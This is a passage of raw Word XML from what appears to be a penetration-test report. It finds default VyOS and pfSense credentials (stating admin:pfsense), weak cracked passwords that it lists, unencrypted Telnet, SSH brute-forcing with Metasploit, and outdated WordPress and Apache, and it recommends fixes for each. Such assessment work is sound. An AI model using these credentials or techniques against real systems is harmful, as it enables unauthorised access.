          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Many of</w:t>
      </w:r>
      <w:r w:rsidR="004459D4" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the systems </w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the network utilized were shown to have their default credentials still in place.  VyOS, </w:t>
      </w:r>
      <w:r w:rsidR="00ED7D2D" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the operating system that the routers </w:t>
      </w:r>
      <w:r w:rsidR="001059B8" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>utilize</w:t>
      </w:r>
      <w:r w:rsidR="00ED7D2D" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to function, uses its own name as its username and password</w:t>
      </w:r>
      <w:r w:rsidR="00CE3778" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. For every router on the system, this default login </w:t>
      </w:r>
      <w:r w:rsidR="001059B8" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">was found to be used.  </w:t>
      </w:r>
      <w:r w:rsidR="00223270" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The fact that the login credential for the entire system is available from a simple </w:t>
      </w:r>
      <w:r w:rsidR="001B182C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>browser search is deeply concerning as threat actors can easily infiltrate through this vector alone.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59847571" w14:textId="79686EB9" w:rsidR="001B182C" w:rsidRPr="00521489" w:rsidRDefault="001B182C" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">On top of this, the Pfsense firewall </w:t>
      </w:r>
      <w:r w:rsidR="00005C9C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>also displayed having its default credentials still active on the system.  When the tester prompted the login with admin:pfsense for the username and password they were successfully able to gain access to the firewall.  Another instance of the same</w:t>
      </w:r>
      <w:r w:rsidR="00AE1EB7" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> concern where a Google search is all that stands in the way of an attack on the system. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9EA924" w14:textId="07E6A60A" w:rsidR="00AE1EB7" w:rsidRPr="00521489" w:rsidRDefault="00AE1EB7" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">To rectify this vulnerability, the tester recommends </w:t>
      </w:r>
      <w:r w:rsidR="00125CA6" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a change from these default credentials. Changing the logins to have strong passwords with many requirements in length and characters would ensure that the network is safe from simplistic threat vectors. </w:t>
      </w:r>
      <w:r w:rsidR="00BA0EA4" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Below is a simple tutorial on how to change the password for each of the software mentioned above:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DF1BED" w14:textId="56430B9F" w:rsidR="00BA0EA4" w:rsidRPr="00521489" w:rsidRDefault="00BA0EA4" w:rsidP="004459D4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VyOS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57380981" w14:textId="4DB36441" w:rsidR="00BA0EA4" w:rsidRPr="00521489" w:rsidRDefault="00023605" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sudo usermod -l </w:t>
      </w:r>
      <w:r w:rsidR="005C7334" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>new username</w:t>
      </w:r>
      <w:r w:rsidR="005C7334" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005C7334" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>old username</w:t>
      </w:r>
      <w:r w:rsidR="005C7334" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8EC1B1" w14:textId="7EAC6525" w:rsidR="00023605" w:rsidRPr="00521489" w:rsidRDefault="005C7334" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sudo passwd *new password*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B46DE79" w14:textId="4D709A60" w:rsidR="0013622E" w:rsidRPr="00521489" w:rsidRDefault="0013622E" w:rsidP="0013622E">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pfSense</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5501694A" w14:textId="67A97E30" w:rsidR="0013622E" w:rsidRPr="00521489" w:rsidRDefault="000F3B72" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Log onto admin account</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74409545" w14:textId="63298D2F" w:rsidR="000F3B72" w:rsidRPr="00521489" w:rsidRDefault="000F3B72" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Navigate to System, User Manager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EE69AB" w14:textId="02FD2F7A" w:rsidR="000F3B72" w:rsidRPr="00521489" w:rsidRDefault="000F3B72" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Change the credentials</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662CCBA8" w14:textId="77777777" w:rsidR="00D43F2C" w:rsidRPr="00521489" w:rsidRDefault="00D43F2C" w:rsidP="00D43F2C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc183984561"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Weak Password Requirements</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w14:paraId="2F518A20" w14:textId="5633E543" w:rsidR="00D43F2C" w:rsidRPr="00521489" w:rsidRDefault="00B63BA4" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">There are several examples throughout the network examination </w:t>
      </w:r>
      <w:r w:rsidR="000A5FB3" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r w:rsidR="00550ECE" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">grotesquely simple passwords.  The passwords discovered throughout were so simple that they were discovered using a relatively small and common library known as John.  The logins for several accounts </w:t>
      </w:r>
      <w:r w:rsidR="005A77F6" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>were compromised with passwords including apples, pears, plums</w:t>
      </w:r>
      <w:r w:rsidR="00B94E52" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, !gatvol, and zxc</w:t>
      </w:r>
      <w:r w:rsidR="00C96DFF" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>123</w:t>
      </w:r>
      <w:r w:rsidR="00AF690B" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r w:rsidR="008A2138" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">A common issue that these passwords exhibit is their short length, often being a simple word for an everyday object.  Passwords such as these are more than often compromised just for their unsecure nature.  </w:t>
      </w:r>
      <w:r w:rsidR="00D821C2" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">On top of this, only one password displays a use of any special characters (!gatvol with an exclamation mark) </w:t>
      </w:r>
      <w:r w:rsidR="00C635B3" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">and only one other contains any numbers.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33066C22" w14:textId="36B50854" w:rsidR="00C635B3" w:rsidRPr="00521489" w:rsidRDefault="00C635B3" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="360"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>A good stand</w:t>
      </w:r>
      <w:r w:rsidR="00451472" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ard as set by CISA</w:t>
      </w:r>
      <w:r w:rsidR="000A64BE" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB5D039" w14:textId="660721CC" w:rsidR="000A64BE" w:rsidRPr="00521489" w:rsidRDefault="000A64BE" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Require strong, unique passwords</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3933A7" w14:textId="16D60965" w:rsidR="000A64BE" w:rsidRPr="00521489" w:rsidRDefault="00DA1048" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>16 characters in length at least</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6212811C" w14:textId="2E1DA13D" w:rsidR="00DA1048" w:rsidRPr="00521489" w:rsidRDefault="00020C93" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Randomness – require a strong mix of characters, or a </w:t>
      </w:r>
      <w:r w:rsidR="00DD4356" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>random string of words that mean nothing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DFD18AD" w14:textId="18B814F2" w:rsidR="00FC23CF" w:rsidRPr="00521489" w:rsidRDefault="00FC23CF" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Require special characters, numbering, and capitalization throughout the password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CAB898" w14:textId="5D816FDF" w:rsidR="00DD4356" w:rsidRPr="00521489" w:rsidRDefault="00DD4356" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Only one account per password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6C524F" w14:textId="75A7615E" w:rsidR="00BF1B6E" w:rsidRPr="00521489" w:rsidRDefault="007C77F0" w:rsidP="00BF1B6E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc183984562"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>This issue with Telnet</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="11D32FC0" w14:textId="1922864C" w:rsidR="004E1A11" w:rsidRPr="00521489" w:rsidRDefault="00AE2B4C" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Telnet, </w:t>
      </w:r>
      <w:r w:rsidR="00B11284" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">although a convenient tool to allow for a user to </w:t>
      </w:r>
      <w:r w:rsidR="009C434B" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">utilize the terminal to log on and manipulate the network, is unsecure.  Telnet as a service lacks encryption, </w:t>
      </w:r>
      <w:r w:rsidR="00543A40" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">leaving any commands ran from telnet vulnerable to simple packet </w:t>
      </w:r>
      <w:r w:rsidR="00110AB3" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">attacks such as packet sniffing.  From the login credentials to the ip routers and interfaces </w:t>
      </w:r>
      <w:r w:rsidR="00C611A5" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the entirety of telnet leaves itself vulnerable to attacks.  Replacing telnet with a more secure option, such as SSH</w:t>
      </w:r>
      <w:r w:rsidR="00CC77D7" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, would allow for the same benefits to the end user as telnet with the added benefit of </w:t>
      </w:r>
      <w:r w:rsidR="004E1A11" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">encrypted communication with the routers.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB265BB" w14:textId="6C1E7425" w:rsidR="00BF1B6E" w:rsidRPr="00521489" w:rsidRDefault="007C77F0" w:rsidP="00BF1B6E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc183984563"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SSH</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="0AEDFAAE" w14:textId="3921B24A" w:rsidR="0091038A" w:rsidRPr="00521489" w:rsidRDefault="00EA537D" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Although utilizing SSH is good OpSec practice, the tester discovered that the SSH default settings were enabled on many devices utilizing this protocol.  With simple usage of a tool such as Metasploit, the tester managed to use a brute force login cracker to gain access to the SSH protocol on several machines.  It is recommended to the network that these default settings should be changed to include a lockout and logging process.  This can be done by navigating to /etc/pam.d/ssh and changing the attributes labeled deny and unlock_time. With the timeout and log in place, the network can be properly managed in the event of an attack.    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C888205" w14:textId="5E6C199B" w:rsidR="00BF1B6E" w:rsidRPr="00521489" w:rsidRDefault="00AC33FB" w:rsidP="00BF1B6E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc183984564"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Out of Date Serv</w:t>
      </w:r>
      <w:r w:rsidR="003F1261" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ices</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="0B8FEEEA" w14:textId="13F71829" w:rsidR="00EA537D" w:rsidRPr="00521489" w:rsidRDefault="00DB4BBE" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">There are several services utilized throughout the network that are severely out of date.  One example is the WordPress </w:t>
      </w:r>
      <w:r w:rsidR="00F503D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">service discovered on PC1 which was found to be running on </w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>version</w:t>
      </w:r>
      <w:r w:rsidR="00F503D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007B1D8E" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3.3.1</w:t>
      </w:r>
      <w:r w:rsidR="00F503D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  This version </w:t>
      </w:r>
      <w:r w:rsidR="007B1D8E" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">was released </w:t>
      </w:r>
      <w:r w:rsidR="00F503D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>January 3</w:t>
      </w:r>
      <w:r w:rsidR="00F503D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>rd</w:t>
      </w:r>
      <w:r w:rsidR="00F503D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 2012, 12 years after the testing occurred. Having a service this severely out of date leaves the entirety of the network vulnerable to abusers as there are several known vulnerabilities for this specific version publicly available on websites such as exploitdb.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A316586" w14:textId="05EF8740" w:rsidR="00B61CE6" w:rsidRPr="00521489" w:rsidRDefault="00F503D0" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Another service severely out of date is the Apache web server that the web servers utilize on the network.  This network utilizes Apache version 2.2.22, a version that </w:t>
      </w:r>
      <w:r w:rsidR="00ED2D67" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>was released</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B61CE6" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">back in January of 2012.  The combination of these two services being this out of date suggests that the network has not been properly updated and </w:t>
      </w:r>
      <w:r w:rsidR="00ED2D67" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>maintained</w:t>
      </w:r>
      <w:r w:rsidR="00B61CE6" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for over a decade at least.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2B76BC" w14:textId="22234C2D" w:rsidR="00B61CE6" w:rsidRPr="00521489" w:rsidRDefault="00B61CE6" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">A solution to this issue is to update all services on the network to their </w:t>
      </w:r>
      <w:r w:rsidR="00ED2D67" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>up-to-date</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> stable releases.  For Apache</w:t>
      </w:r>
      <w:r w:rsidR="00ED2D67" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> that is version 2.4.62 at the time of this documentation and for WordPress</w:t>
      </w:r>
